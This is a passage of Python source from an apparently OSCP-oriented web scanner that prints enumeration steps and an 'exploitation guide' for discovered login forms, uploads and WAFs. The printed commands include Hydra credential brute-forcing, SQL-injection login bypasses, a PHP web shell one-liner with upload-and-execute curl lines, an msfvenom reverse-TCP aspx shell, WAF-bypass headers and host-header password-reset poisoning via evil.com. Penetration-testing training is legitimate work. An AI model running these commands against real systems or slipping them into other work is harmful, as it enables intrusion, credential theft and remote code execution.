            pr.status_line and "404" in pr.status_line and
            pr.tech and any("httpapi" in t.lower() for t in pr.tech)
        )
        quickwins = build_web_quickwins(pr, host)
        if quickwins:
            # Commands already executed inline — filter from next steps to reduce noise.
            # These are ALL paths already covered by SENSITIVE_PROBE_PATHS, WEB_PROBE_TOP,
            # run_quick_web_checks(), and http_analyze() — no need to repeat them.
            executed_patterns = [
                # Core scanner steps already done
                r"curl -sIkL", r"curl -sSikL", r"curl -sS.*head -n 1",
                r"curl -sS.*robots", r"curl -sS.*sitemap",
                r"whatweb", r"wafw00f", r"nikto",
                # IIS/ASP.NET — run by run_quick_web_checks()
                r"curl.*web\.config", r"curl.*Web\.config",
                r"curl.*trace\.axd", r"curl.*elmah\.axd",
                r"curl.*ScriptResource\.axd", r"curl.*WebResource\.axd",
                # Security/discovery files — auto-probed
                r"curl.*\.well-known", r"curl.*security\.txt",
                r"curl.*crossdomain\.xml", r"curl.*clientaccesspolicy",
                # Environment / config files — in SENSITIVE_PROBE_PATHS
                r"curl.*\.env", r"curl.*\.env\.",
                r"curl.*config\.php", r"curl.*config\.inc",
                r"curl.*configuration\.php", r"curl.*settings\.php",
                r"curl.*settings\.py", r"curl.*database\.yml",
                r"curl.*secrets\.yml", r"curl.*application\.yml",
                r"curl.*application\.properties", r"curl.*appsettings",
                r"curl.*\.htaccess", r"curl.*\.htpasswd",
                r"curl.*wp-config", r"curl.*wp-config\.php",
                # Git / VCS exposure — in WEB_PROBE_TOP
                r"curl.*\.git/HEAD", r"curl.*\.git/config",
                r"curl.*\.git/index", r"curl.*\.git/COMMIT",
                r"curl.*\.git/logs", r"curl.*\.gitignore",
                r"curl.*\.svn", r"curl.*\.hg/",
                # shortscan is now auto-run by run_quick_web_checks
                r"shortscan ",
                # git-dumper follow-ups only relevant if .git confirmed exposed
                # (shown contextually by sensitive_files, not as generic next step)
                r"git-dumper",
                r"cd /tmp/git-dump",
                # Backup/archive dirs — auto-probed
                r"curl.*backup/.*-I", r"curl.*backups/.*-I",
                r"curl.*old/.*-I", r"curl.*archive/.*-I",
                # PHP info / debug pages — in SENSITIVE_PROBE_PATHS
                r"curl.*phpinfo", r"curl.*info\.php",
                r"curl.*test\.php", r"curl.*php\.ini",
            ]
            
            # Filter out already-executed commands
            filtered_wins = []
            for cmd in quickwins:
                if cmd.startswith("#"):
                    filtered_wins.append(cmd)
                    continue
                # Check if this command was already executed
                is_duplicate = False
                for pattern in executed_patterns:
                    if re.search(pattern, cmd):
                        is_duplicate = True
                        break
                if not is_duplicate:
                    filtered_wins.append(cmd)
            
            if filtered_wins:
                # Split into: section comments, dirbusting (feroxbuster/gobuster/ffuf/wfuzz -w),
                # and everything else. Dirbust commands are printed last, grouped by tier
                # (the tier headers are the # === ... === comment lines above each group).
                _wl_cmds = [c for c in filtered_wins if
                            not c.startswith("#") and
                            any(t in c for t in ("feroxbuster", "gobuster", "ffuf", "wfuzz", "dirb")) and
                            "-w " in c]
                _other_cmds = [c for c in filtered_wins if c not in _wl_cmds]

                print(f"\n  {C.PURPLE}{C.BOLD}▶ NEXT ENUMERATION STEPS:{C.END}")
                count = 0
                _pending_header = None
                for cmd in _other_cmds[:30]:
                    if cmd.startswith("#"):
                        _pending_header = cmd
                    else:
                        if _pending_header is not None:
                            print(f"    {C.GREY}{_pending_header}{C.END}")
                            _pending_header = None
                        count += 1
                        print(f"    {C.CYAN}[{count}]{C.END} {cmd}")

                # ── robots.txt Disallow path targeting ────────────────────────
                # Extract unique BASE directories, cap to 4 most interesting.
                # Joomla/WP can have 15+ entries — don't generate 15 feroxbuster commands.
                _robots_raw_paths = []
                if pr.robots.present and pr.robots.snippet:
                    for _rl in pr.robots.snippet.splitlines():
                        _rl = _rl.strip()
                        if _rl.lower().startswith("disallow:"):
                            _rpath = _rl.split(":", 1)[1].strip().rstrip("/")
                            if _rpath and _rpath != "/" and len(_rpath) > 1:
                                _robots_raw_paths.append(_rpath)
                # Deduplicate to unique first-level base directories
                _robots_bases = {}
                for _rp in _robots_raw_paths:
                    _base = "/" + _rp.strip("/").split("/")[0]
                    if _base not in _robots_bases:
                        _robots_bases[_base] = _rp
                # Prioritize interesting dirs
                _interesting = ["admin", "api", "upload", "config", "tmp", "log",
                                "backup", "dev", "test", "private", "secret", "old",
                                "install"]
                _sorted_bases = sorted(_robots_bases.keys(),
                    key=lambda b: (0 if any(i in b.lower() for i in _interesting) else 1, b))
                _robots_dirs = _sorted_bases[:4]
                if _robots_dirs:
                    _tech_lower = " ".join(t.lower() for t in (pr.tech or []))
                    if any(x in _tech_lower for x in ("iis", "asp", "aspnet")):
                        _rexts = "aspx,asp,config,txt,bak"
                    elif any(x in _tech_lower for x in ("java", "tomcat", "jsp")):
                        _rexts = "jsp,do,action,txt,bak"
                    else:
                        _rexts = "php,txt,html,bak,old"
                    _rwl = WL.get("web_common", "/usr/share/wordlists/dirb/common.txt")
                    _extra = f"  {C.GREY}({len(_robots_bases)} base dirs in robots.txt, showing top {len(_robots_dirs)}){C.END}" if len(_robots_bases) > 4 else ""
                    print(f"\n  {C.YELLOW}{C.BOLD}  ▷ ROBOTS.TXT PATHS (enumerate what the server reveals):{C.END}{_extra}")
                    for _rd in _robots_dirs:
                        _rd_url = curl_url.rstrip("/") + _rd + "/"
                        count += 1
                        print(f"    {C.CYAN}[{count}]{C.END} feroxbuster -u {q(_rd_url)} -x {_rexts} --extract-links -C 404 -t 50 -q -w {_rwl}")
                    _rd_list = " ".join(q(curl_url.rstrip("/") + d + "/") for d in _robots_dirs[:4])
                    count += 1
                    print(f"    {C.CYAN}[{count}]{C.END} for u in {_rd_list}; do echo \"=== $u ===\"; curl -sk \"$u\" | head -20; done")

                # Print dirbusting commands — max 5, deduplicated by wordlist tier.
                # Strategy: 1 quick (common.txt), 1 medium (raft-medium), 1 deep (raft-large),
                # 1 vhost/param, 1 API/CMS-specific. Stop early if tiers repeat.
                if _wl_cmds:
                    print(f"\n  {C.YELLOW}{C.BOLD}  ▷ DIRECTORY BRUTE-FORCE:{C.END}  "
                          f"{C.GREY}(7 tiers — stop when you have enough hits){C.END}")
                    # Deduplicate: prefer feroxbuster > gobuster > ffuf for same wordlist tier
                    _seen_wl_tiers = set()
                    _selected_wl = []
                    for cmd in _wl_cmds:
                        # Identify tier by wordlist keyword
                        _tier = "other"
                        if "common.txt" in cmd or ("common" in cmd and "combined" not in cmd): _tier = "quick"
                        elif "raft-medium" in cmd or ("medium" in cmd and "combined" not in cmd): _tier = "medium"
                        elif "combined_lower" in cmd or "lowercase-combined" in cmd: _tier = "combined_lower"
                        elif "combined" in cmd: _tier = "combined"
                        elif "raft-large" in cmd or "large" in cmd or "big" in cmd: _tier = "deep"
                        elif "api" in cmd.lower(): _tier = "api"
                        elif "vhost" in cmd.lower() or "Host: FUZZ" in cmd: _tier = "vhost"
                        elif "FUZZ=1" in cmd or "parameter" in cmd.lower(): _tier = "param"
                        elif "quickhits" in cmd or "IIS" in cmd: _tier = "special"
                        # Skip if we already have this tier covered
                        if _tier in _seen_wl_tiers:
                            continue
                        _seen_wl_tiers.add(_tier)
                        _selected_wl.append(cmd)
                        if len(_selected_wl) >= 7:
                            break
                    # Walk filtered_wins to emit headers + selected commands in original order
                    _pending_wl_header = None
                    for cmd in filtered_wins:
                        if cmd.startswith("#") and cmd not in _other_cmds:
                            _pending_wl_header = cmd
                        elif cmd in _selected_wl:
                            if _pending_wl_header is not None:
                                _tier_col = C.CYAN if "TIER" in _pending_wl_header else C.GREY
                                print(f"    {_tier_col}{_pending_wl_header}{C.END}")
                                _pending_wl_header = None
                            count += 1
                            print(f"    {C.CYAN}[{count}]{C.END} {cmd}")


    # ── Web exploitation workflow ─────────────────────────────────────────────
    # Skip the full exploitation guide on WinRM/pure-404 ports — it's irrelevant
    # and just creates noise. These ports have no web surface to exploit.
    _is_dead_port = pr.port in (5985, 5986) or (
        pr.status_line and "404" in pr.status_line and
        pr.tech and any("httpapi" in t.lower() for t in pr.tech) and
        not pr.forms and not pr.probes
    )
    if _is_dead_port:
        return  # Nothing more to show for WinRM/HTTPAPI 404-only ports

    # Context-sensitive attack playbook based on what was found.
    _has_login   = any(f.get("has_password") for f in (pr.forms or []))
    _has_upload  = any(f.get("has_upload")   for f in (pr.forms or []))
    _waf_active  = bool(pr.waf_detected and pr.waf_detected.lower() not in ("none",""))
    _is_aspnet   = any("asp" in t.lower() or "iis" in t.lower() for t in (pr.tech or []))
    _is_php      = any("php" in t.lower() for t in (pr.tech or []))
    _is_wp       = any("wordpress" in t.lower() for t in (pr.tech or []))

    # Only print exploitation guide header if we have contextual findings
    _has_exploit_content = _has_login or _has_upload or _waf_active
    if _has_exploit_content:
        print(f"\n  {C.PURPLE}{C.BOLD}▶ WEB EXPLOITATION GUIDE:{C.END}")

    # ── Login form workflow ────────────────────────────────────────────────────
    if _has_login:
        # Get form details
        _login_forms = [f for f in (pr.forms or []) if f.get("has_password")]
        _form = _login_forms[0] if _login_forms else {}
        _action = _form.get("action", "./")
        _inputs = _form.get("inputs", "user=FUZZ&pass=FUZZ")
        # Build a best-guess POST target
        from urllib.parse import urljoin as _urljoin
        _post_url = _urljoin(curl_url, _action) if _action not in ("./", "/", "", "#") else curl_url

        print(f"\n  {C.RED}  ── LOGIN FORM FOUND → Exploitation workflow ────────────────────────{C.END}")
        print(f"  {C.GREY}# STEP 1: Manual — try obvious creds first (30 sec){C.END}")
        _default_creds = [
            ("admin","admin"), ("admin","password"), ("admin","admin123"),
            ("administrator","administrator"), ("admin",""), ("root","root"),
        ]
        if _is_aspnet: _default_creds += [("butch","butch"), ("user","user")]
        if _is_wp:     _default_creds  = [("admin","admin"), ("admin","password")]

        # --- Parse field names correctly from the comma-separated inputs string ---
        # extract_forms() stores inputs as "field1, field2, ..." not "k=v&k=v"
        _fields_list = [f.strip() for f in _inputs.split(",") if f.strip()]
        # Pick the first field whose name looks like a username field; fall back to first field
        _uf = next(
            (f for f in _fields_list if any(x in f.lower() for x in ("user","login","email","name"))),
            _fields_list[0] if _fields_list else "username"
        )
        # Pick the first field whose name looks like a password field; fall back to "password"
        _pf = next(
            (f for f in _fields_list if any(x in f.lower() for x in ("pass","pwd","secret"))),
            "password"
        )
        # CSRF / hidden token fields (Laravel _token, Django csrfmiddlewaretoken, etc.)
        _csrf_fields = [f for f in _fields_list
                        if any(x in f.lower() for x in ("token","csrf","_token","nonce","authenticity"))]

        # Show CSRF token fetch step if relevant (Laravel, Django, Rails, etc.)
        if _csrf_fields:
            _csrf_field = _csrf_fields[0]
            print(f"  {C.GREY}# CSRF token required — fetch it first:{C.END}")
            print(f"  {C.GREY}>> {_csrf_field}=$(curl -sk {q(curl_url)} | grep -oP '(?<=name=\"{_csrf_field}\" value=\")[^\"]+' | head -1){C.END}")
            print(f"  {C.GREY}# Then include it in POST: {_csrf_field}=${_csrf_field}&{_uf}=admin&{_pf}=admin{C.END}")

        for _u, _p in _default_creds[:4]:
            if _csrf_fields:
                _csrf_field = _csrf_fields[0]
                print(f"  {C.GREY}>> curl -sk -c /tmp/c.txt {q(curl_url)} > /dev/null && {_csrf_field}=$(curl -sk -b /tmp/c.txt {q(curl_url)} | grep -oP '(?<=name=\"{_csrf_field}\" value=\")[^\"]+') && curl -sk -X POST {q(_post_url)} -b /tmp/c.txt -d \"{_csrf_field}=${{{_csrf_field}}}&{_uf}={_u}&{_pf}={_p}\" -L | grep -i 'welcome|dashboard|logout|invalid'{C.END}")
            else:
                print(f"  {C.GREY}>> curl -sk -X POST {q(_post_url)} -d {q(_uf+'='+_u+'&'+_pf+'='+_p)} -L -c /tmp/cookies.txt | grep -i 'welcome|dashboard|logout|invalid'{C.END}")

        print(f"\n  {C.GREY}# STEP 2: Burp Intruder — credential spray (CTRL+I in Burp){C.END}")
        print(f"  {C.GREY}# In Burp: intercept POST → right-click → Send to Intruder{C.END}")
        print(f"  {C.GREY}# Positions tab: mark §{_pf}§ field → Attack type: Sniper{C.END}")
        print(f"  {C.GREY}# Payloads tab: Simple list → add rockyou / common passwords{C.END}")
        print(f"  {C.GREY}# Options: Grep-Match 'incorrect|invalid|failed' to spot successes{C.END}")

        print(f"\n  {C.GREY}# STEP 3: Hydra brute-force{C.END}")
        # _uf and _pf already parsed correctly above; reuse for hydra
        _user_field = _uf
        _pass_field = _pf
        _hydra_method = "http-post-form" if _form.get("method","").upper() == "POST" else "http-get-form"
        _hydra_path = _post_url.replace(base_url.rstrip("/"), "").rstrip("/") or "/"
        # Build body string; include CSRF field as a static placeholder if present
        _csrf_part = (f"{_csrf_fields[0]}=CSRF_TOKEN_HERE&" if _csrf_fields else "")
        _hydra_str = f"{_hydra_path}:{_csrf_part}{_user_field}=^USER^&{_pass_field}=^PASS^:F=incorrect"
        if _csrf_fields:
            print(f"  {C.GREY}# Note: CSRF token — fetch manually first, hard-code into hydra body or use Burp instead{C.END}")
        print(f"  {C.GREY}>> hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt {host} {_hydra_method} {q(_hydra_str)} -t 1 -V{C.END}")
        print(f"  {C.GREY}>> hydra -l admin -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} {host} {_hydra_method} {q(_hydra_str)} -t 1{C.END}")

        print(f"\n  {C.GREY}# STEP 4: SQL injection on login (MANUAL — sqlmap is OSCP-banned){C.END}")
        _sqli1 = _user_field + "=' OR '1'='1'-- -&" + _pass_field + "=x"
        print(f"  {C.GREY}>> curl -sk -X POST {q(_post_url)} -d {q(_sqli1)} | grep -i 'welcome|dashboard'{C.END}")
        _sqli2 = _user_field + "=admin'-- -&" + _pass_field + "=x"
        print(f"  {C.GREY}>> curl -sk -X POST {q(_post_url)} -d {q(_sqli2)} -c /tmp/c.txt -L | head -50{C.END}")
        # UNION-based column count detection
        print(f"  {C.GREY}# UNION column count: increment NULL until no error{C.END}")
        print(f"  {C.GREY}>> curl -sk -X POST {q(_post_url)} -d '{_user_field}=admin' ORDER BY 1-- -&{_pass_field}=x' | head -30{C.END}")
        print(f"  {C.GREY}# Time-based blind: ' OR SLEEP(5)-- (MySQL) / '; WAITFOR DELAY '0:0:5'-- (MSSQL){C.END}")
        if _is_aspnet:
            print(f"  {C.GREY}# ASP.NET: also try __VIEWSTATE / __EVENTVALIDATION bypass — use Burp to intercept and modify{C.END}")
            print(f"  {C.GREY}>> python3 viewgen.py --guess {q(curl_url)}  # if viewstate key is guessable{C.END}")

    # ── File upload exploitation ───────────────────────────────────────────────
    if _has_upload:
        print(f"\n  {C.RED}  ── FILE UPLOAD FOUND → Exploitation workflow ───────────────────────{C.END}")
        print(f"  {C.GREY}# Check allowed extensions — try: .php, .php5, .phtml, .asp, .aspx, .jsp{C.END}")
        if _is_aspnet:
            print(f"  {C.GREY}>> curl -sk -F 'file=@shell.aspx;type=image/jpeg' {q(curl_url)}upload  # MIME bypass{C.END}")
            print(f"  {C.GREY}# Create shell: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f aspx > shell.aspx{C.END}")
        if _is_php:
            print(f"  {C.GREY}>> echo '<?php system($_GET[\"c\"]); ?>' > shell.php{C.END}")
            print(f"  {C.GREY}>> curl -sk -F 'file=@shell.php' {q(curl_url)} && curl {q(curl_url)}uploads/shell.php?c=id{C.END}")
        print(f"  {C.GREY}# Double extension bypass: shell.php.jpg, shell.php%00.jpg{C.END}")
        print(f"  {C.GREY}# Magic bytes bypass: prepend GIF89a; to PHP payload{C.END}")
        print(f"  {C.GREY}# In Burp: intercept upload → change Content-Type to image/jpeg → forward{C.END}")

    # ── WAF bypass (when detected) ─────────────────────────────────────────────
    if _waf_active:
        _waf = pr.waf_detected or "WAF"
        print(f"\n  {C.YELLOW}  ── WAF DETECTED ({_waf}) → Bypass techniques ───────────────────────{C.END}")
        print(f"  {C.GREY}# 1. Case variation: /Admin /ADMIN /aDmIn{C.END}")
        print(f"  {C.GREY}# 2. Path encoding: /%61dmin/ /admin%2F /admin;/ /.%2e/admin/{C.END}")
        print(f"  {C.GREY}# 3. Header bypass: -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1'{C.END}")
        print(f"  {C.GREY}# 4. Origin spoof: -H 'X-Originating-IP: 127.0.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1'{C.END}")
        print(f"  {C.GREY}>> curl -sk {q(curl_url)} -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1'{C.END}")
        print(f"  {C.GREY}>> feroxbuster -u {q(curl_url)} --burp-replay 127.0.0.1:8080 --random-agent --rate-limit 10{C.END}")

    # ── Default credentials found ──────────────────────────────────────────────
    if getattr(pr, "default_creds_found", None):
        print(f"\n  {C.RED}  ── 💀 DEFAULT CREDENTIALS CONFIRMED ───────────────────────────────{C.END}")
        for _dc in pr.default_creds_found:
            print(f"  {C.RED}⚡ {_dc['finding']}{C.END}")
            print(f"    {C.WHITE}App:{C.END} {_dc['app']}  {C.WHITE}Path:{C.END} {_dc['path']}")
            _scheme = "https" if pr.is_ssl else "http"
            print(f"    {C.GREY}>> curl -sk {q(curl_url.rstrip('/') + _dc['path'])}{C.END}")

    # ── Active 403 bypass results ──────────────────────────────────────────────
    if getattr(pr, "bypass_403_found", None):
        print(f"\n  {C.RED}  ── 🔓 403 BYPASS CONFIRMED ({len(pr.bypass_403_found)} path(s)) ─────────────────────{C.END}")
        for _bp_label, _bp_info in pr.bypass_403_found.items():
            # Support both old str format (backwards compat) and new dict format
            if isinstance(_bp_info, dict):
                _bp_cmd     = _bp_info.get("cmd", "")
                _bp_status  = _bp_info.get("status", "")
                _bp_finding = _bp_info.get("finding", "")
                _bp_snippet = _bp_info.get("snippet", "")
            else:
                _bp_cmd, _bp_status, _bp_finding, _bp_snippet = "", "", str(_bp_info), ""

            print(f"  {C.RED}⚡ {_bp_label}{C.END}")
            if _bp_cmd:
                print(f"    {C.WHITE}$ {_bp_cmd}{C.END}")   # repro command ABOVE the result
            if _bp_finding:
                print(f"    {C.YELLOW}{_bp_finding}{C.END}")
            if _bp_snippet:
                # Truncate and dim the body snippet so it reads as evidence not noise
                print(f"    {C.DIM}Body: {_bp_snippet[:140]}{C.END}")

    # ── Host header injection ──────────────────────────────────────────────────
    if getattr(pr, "host_header_injection", None):
        print(f"\n  {C.RED}  ── 🎯 HOST HEADER INJECTION ───────────────────────────────────────{C.END}")
        for _hhi_tech, _hhi_detail in pr.host_header_injection.items():
            print(f"  {C.RED}⚡ {_hhi_tech}{C.END}")
            print(f"    {C.GREY}{_hhi_detail}{C.END}")
        print(f"  {C.GREY}# Exploit: trigger password-reset, observe email link — does it use your injected host?{C.END}")
        print(f"  {C.GREY}# Also check: does app use Host header for SSRF, cache keys, or link generation?{C.END}")
        print(f"  {C.GREY}>> curl -sk -X POST {q(curl_url.rstrip('/')+'/password-reset')} -H 'Host: evil.com' -d 'email=victim@target.com'{C.END}")

    # ── wpscan output ──────────────────────────────────────────────────────────
    _wpscan = getattr(pr, "wpscan_out", "")
    if _wpscan and _wpscan not in ("", "[wpscan timeout]"):
        print(f"\n  {C.CYAN}  ── wpscan passive results ─────────────────────────────────────────{C.END}")
        _wp_lines = _wpscan.splitlines()
        for _wl in _wp_lines:
            _wl_s = _wl.strip()
            if not _wl_s or _wl_s.startswith("___") or "Scan Aborted" in _wl_s:
                continue
            _col = (C.RED    if any(x in _wl_s.lower() for x in ("vulnerability","exploit","cve-","critical")) else
                    C.YELLOW if any(x in _wl_s.lower() for x in ("interesting","found","detected","version")) else
                    C.GREY)
            print(f"  {_col}{_wl_s[:220]}{C.END}")
    elif _wpscan == "[wpscan timeout]":
        print(f"  {C.YELLOW}  wpscan timed out — run manually: wpscan --url {q(curl_url)} -e ap,at,u --plugins-detection passive{C.END}")



def build_attack_surface_highlights(open_ports: list) -> list:
    """Return list of (color, message) tuples for notable attack surface items."""
    hits = []
    for sp in sorted(open_ports, key=lambda x: x.port):
        s = sp.detected_service or sp.service_guess or ""
        if any(f.get("has_password") for f in (sp.forms or [])):
            hits.append((C.RED,    f"Port {sp.port} ({s}): LOGIN FORM — credential brute-force target"))
        if sp.methods:
            dm = [m for m in sp.methods if m in ("PUT","DELETE","TRACE","CONNECT")]
            if dm:
                hits.append((C.RED, f"Port {sp.port} ({s}): DANGEROUS METHODS: {', '.join(dm)}"))
        if sp.nikto_out:
            for nf in sp.nikto_out.splitlines():
                if any(x in nf.lower() for x in _NIKTO_HIGH_VALUE):
                    hits.append((C.RED, f"Port {sp.port} NIKTO: {nf.strip()[:100]}"))
        if (s == "FTP" or sp.port == 21) and PROBE_CACHE.get("ftp_anon", {}).get(sp.port, {}).get("anon_allowed"):
            hits.append((C.RED,    f"Port {sp.port}: FTP ANONYMOUS LOGIN ALLOWED"))
        if s in ("Telnet",) or sp.port == 23:
            hits.append((C.YELLOW, f"Port {sp.port}: TELNET open — cleartext protocol"))
        if sp.db_anon_access:
            for db in sp.db_anon_access:
                hits.append((C.RED, f"Port {sp.port}: {db.upper()} UNAUTHENTICATED ACCESS"))
        # New checks
        if getattr(sp, "default_creds_found", None):
            for _dc in sp.default_creds_found:
                hits.append((C.RED, f"Port {sp.port} ({s}): 💀 DEFAULT CREDS — {_dc['app']} {_dc['user']}"))
        if getattr(sp, "bypass_403_found", None):
            hits.append((C.RED, f"Port {sp.port} ({s}): 🔓 403 BYPASS FOUND ({len(sp.bypass_403_found)} path(s))"))
        if getattr(sp, "host_header_injection", None):
            hits.append((C.RED, f"Port {sp.port} ({s}): 🎯 HOST HEADER INJECTION — password-reset poisoning risk"))
        # Error disclosure cross-reference (proxy leaks, stack traces, etc.)
        for _eda in getattr(sp, "error_disclosure_analysis", []):
            if _eda.startswith(("⚡", "💀")):
                hits.append((C.RED, f"Port {sp.port} ({s}): {_eda[:120]}"))
        # Ferox quick: flag high-value dirs found automatically
        _fqr = getattr(sp, "ferox_quick_results", [])
        _fq_200 = [r for r in _fqr if r.get("status") == "200"]
        _fq_auth = [r for r in _fqr if r.get("status") in ("401","403")]
        if _fq_200:
            _fq_paths = ", ".join(r["path"] for r in _fq_200[:5])
            hits.append((C.YELLOW, f"Port {sp.port} ({s}): feroxbuster found {len(_fq_200)} paths — {_fq_paths}{'…' if len(_fq_200)>5 else ''}"))
        if _fq_auth:
            _fa_paths = ", ".join(r["path"] for r in _fq_auth[:4])
            hits.append((C.YELLOW, f"Port {sp.port} ({s}): {len(_fq_auth)} auth-protected path(s): {_fa_paths}"))
    if PROBE_CACHE.get("smb_null_out") and ("Sharename" in PROBE_CACHE["smb_null_out"] or "IPC$" in PROBE_CACHE["smb_null_out"]):
        hits.append((C.RED, "SMB: NULL SESSION allowed — shares accessible"))
    for sp in open_ports:
        if sp.snmp_communities:
            hits.append((C.RED, f"Port {sp.port}: SNMP communities: {', '.join(sp.snmp_communities)}"))
    return hits


def write_report(output_path: str, host: str, os_guess: str, ttl_val: int,
                 open_ports: list, udp_results: list, ident_results: dict,
                 scan_elapsed: str, brief: bool = False) -> None:
    """Write a complete plaintext report (ANSI stripped) to output_path."""
    from datetime import datetime as _dt
    try:
        with open(output_path, "w", encoding="utf-8") as fp:
            def _w(s: str = ""):
                fp.write(strip_ansi(s) + "\n")
            def _sec(title: str):
                _w(); _w("=" * 70); _w(f"  {title}"); _w("=" * 70)
            def _sub(title: str):
                _w(); _w(f"── {title} " + "─" * max(0, 60 - len(title)))

            # ── Header ──────────────────────────────────────────────────────────
            _w("=" * 70)
            _w("  NCSCANNER REPORT  —  1337.codes")
            _w("=" * 70)
            _w(f"  Target : {host}")
            _w(f"  Time   : {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}")
            _w(f"  OS hint: {os_guess} (TTL={ttl_val})")
            _w(f"  Ports  : {','.join(str(p.port) for p in sorted(open_ports, key=lambda x: x.port))}")
            _w("=" * 70)

            # ── Attack surface ────────────────────────────────────────────────────
            hits = build_attack_surface_highlights(open_ports)
            if hits:
                _sec("ATTACK SURFACE HIGHLIGHTS")
                for _, msg in hits:
                    _w(f"  ⚡ {msg}")

            # ── TCP port details ────────────────────────────────────────────────
            _sec("TCP OPEN PORTS")
            for pr in sorted(open_ports, key=lambda x: x.port):
                svc = pr.detected_service or pr.service_guess or "?"
                ident_user = ident_results.get(pr.port, "")
                _w(f"\n{'─'*60}")
                _w(f"  PORT {pr.port}/tcp  —  {svc}" + (f"  [ident: {ident_user}]" if ident_user else ""))
                _w(f"{'─'*60}")
                if pr.banner:        _w(f"  Banner  : {pr.banner}")
                if pr.url:           _w(f"  URL     : {pr.url}")
                if pr.status_line:   _w(f"  Status  : {pr.status_line}")
                if pr.redirect_url:  _w(f"  Redirect: {pr.redirect_url}")
                if pr.title:         _w(f"  Title   : {pr.title}")
                if pr.waf_detected and pr.waf_detected.lower() not in ("none", ""):
                    _w(f"  WAF     : {pr.waf_detected}")
                if pr.tech:          _w(f"  Tech    : {', '.join(pr.tech[:20])}")
                if pr.methods:       _w(f"  Methods : {', '.join(sorted(set(pr.methods)))}")
                if pr.cms_versions:
                    _sub("Versions")
                    for app, ver in pr.cms_versions.items():
                        _w(f"    {app}: {ver}")
                if pr.ssl_cert_info:
                    _sub("SSL Certificate")
                    for k, v in pr.ssl_cert_info.items():
                        _w(f"    {k}: {v}")
                if pr.security_headers:
                    _sub("Security Headers")
                    for sh in pr.security_headers:
                        sev = sh.get("severity", "INFO")
                        sym = "⚠" if sev == "HIGH" else ("✗" if sev == "MED" else "ℹ")
                        _w(f"    {sym} {sh.get('header','')}: {sh.get('issue','')}")
                        if sh.get("fix") and sev in ("HIGH", "MED"):
                            _w(f"      Fix: {sh.get('fix','')}")
                if pr.cors_vuln:
                    _sub("CORS"); _w(f"    {pr.cors_vuln}")
                if pr.forms:
                    _sub("Forms")
                    for f in pr.forms:
                        ftype = "[LOGIN]" if f.get("has_password") else ("[UPLOAD]" if f.get("has_upload") else "")
                        _w(f"    {ftype} {f['method']} → {f['action']}")
                        _w(f"      inputs: {f['inputs']}")
                if pr.cookies:
                    _sub("Cookies")
                    for c in pr.cookies:
                        flags = c.get("flags", "")
                        jwt_warn = c.get("jwt_warn", "")
                        _w(f"    {c['name']}" + (f"  [{flags}]" if flags else "") + (f"  ← {jwt_warn}" if jwt_warn else ""))
                if pr.comments:
                    _sub(f"HTML Comments ({len(pr.comments)})")
                    for cm in pr.comments[:15]:
                        _w(f"    <!-- {cm.get('text','')[:200]} --> (line {cm.get('line','?')})")
                if pr.js_secrets:
                    _sub(f"JS Secrets / Endpoints ({len(pr.js_secrets)})")
                    for s in pr.js_secrets[:15]:
                        _w(f"    {s['type']}: {s['value'][:120]}  ({s['source']})")
                if pr.dev_notes:
                    _sub("Developer Notes (TODO/FIXME/HACK)")
                    for dn in pr.dev_notes[:10]:
                        _w(f"    {dn.get('keyword')}: {dn.get('note','')[:120]}")
                        _w(f"      @ {dn.get('url','')} (line {dn.get('line','?')})")
                if pr.users:
                    _sub("Users found"); _w(f"    {', '.join(pr.users[:20])}")
                if pr.emails:
                    _sub("Emails found"); _w(f"    {', '.join(pr.emails[:20])}")
                if pr.wp_users:
                    _sub("WordPress Users (REST API)"); _w(f"    {', '.join(pr.wp_users[:20])}")
                if pr.actuator_paths:
                    _sub(f"Spring Boot Actuator ({len(pr.actuator_paths)})")
                    for ap in pr.actuator_paths: _w(f"    {ap}")
                if pr.graphql_path:
                    _sub("GraphQL endpoint"); _w(f"    {pr.graphql_path}")
                if pr.is_wildcard_404:
                    _w(f"  ⚠ WILDCARD 404: server returns {pr.wildcard_status} — dir-bust hits may be false positives")
                if pr.sensitive_files:
                    _sub(f"SENSITIVE FILES ({len(pr.sensitive_files)})")
                    for path, content in pr.sensitive_files.items():
                        _w(f"  ── {path} ──")
                        _w(content[:3000])
                if pr.backup_files_found:
                    _sub("Backup / Swap files")
                    for bp, snippet in pr.backup_files_found.items():
                        _w(f"    {bp}  — {snippet[:80]!r}")
                if pr.dir_listings:
                    _sub("Open directory listings")
                    for dl in pr.dir_listings: _w(f"    {dl}")
                if pr.error_disclosures:
                    _sub("Error disclosures")
                    for ed in pr.error_disclosures[:6]: _w(f"    {ed[:120]}")
                if pr.trace_enabled:  _w("  ⚡ HTTP TRACE enabled (XST risk)")
                if pr.put_enabled:
                    for pp in pr.put_enabled: _w(f"  ⚡ HTTP PUT accepted at {pp}")
                if pr.iis_shortname_vuln: _w("  ⚡ IIS 8.3 shortname vulnerability")
                if pr.gobuster_results:
                    _sub(f"Directory brute-force hits ({len(pr.gobuster_results)})")
                    for gb in pr.gobuster_results:
                        sc = gb.get("status", "")
                        sz = f"  [{gb.get('size','')}b]" if gb.get("size") else ""
                        _w(f"    {sc}  {gb.get('path','')}{sz}")
                if pr.sslscan_out:
                    _sub("TLS audit (sslscan)")
                    for ln in pr.sslscan_out.splitlines()[:20]: _w(f"    {ln}")
                if pr.nikto_out:
                    _nk_clean = []
                    for _nl in pr.nikto_out.splitlines():
                        _nls = _nl.strip()
                        if not _nls.startswith("+"): continue
                        if re.match(r"^\+\s+\d+ requests:", _nls): continue
                        _id_m = re.search(r"\[([0-9a-f]+)\]", _nls)
                        if _id_m and _id_m.group(1) in {"013587","007342","007352"}: continue
                        _nk_clean.append(_nls)
                    if _nk_clean:
                        _sub(f"Nikto findings ({len(_nk_clean)})")
                        for nl in _nk_clean: _w(f"    {nl[:220]}")
                if pr.db_anon_access:
                    _sub("Unauthenticated DB access")
                    for db, finding in pr.db_anon_access.items():
                        _w(f"    {db.upper()}: {finding[:200]}")
                if pr.snmp_communities:
                    _sub("SNMP communities")
                    _w(f"    {', '.join(pr.snmp_communities)}")
                if hasattr(pr, "robots") and pr.robots.present and pr.robots.snippet:
